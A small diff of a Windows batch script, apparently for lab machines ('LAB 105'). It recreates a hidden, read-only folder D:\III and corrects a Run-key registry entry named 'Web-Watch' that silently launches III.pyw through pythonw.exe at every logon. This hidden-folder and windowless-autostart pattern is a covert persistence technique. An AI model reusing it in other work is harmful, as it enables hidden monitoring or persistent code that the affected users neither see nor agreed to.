@@ -9,7 +9,7 @@ if exist "D:\III\" (
 	rmdir /s /q "D:\III\"
 	mkdir "D:\III\"
 	attrib +h +r "D:\III\"
-	reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Web-Watch" /t REG_SZ /d "C:\Program Files\Python314\pythonw.exe" "III.pyw" /f
+	reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Web-Watch" /t REG_SZ /d "C:\Program Files\Python314\pythonw.exe D:\III\III.pyw" /f
 )
 
 rem LAB 105
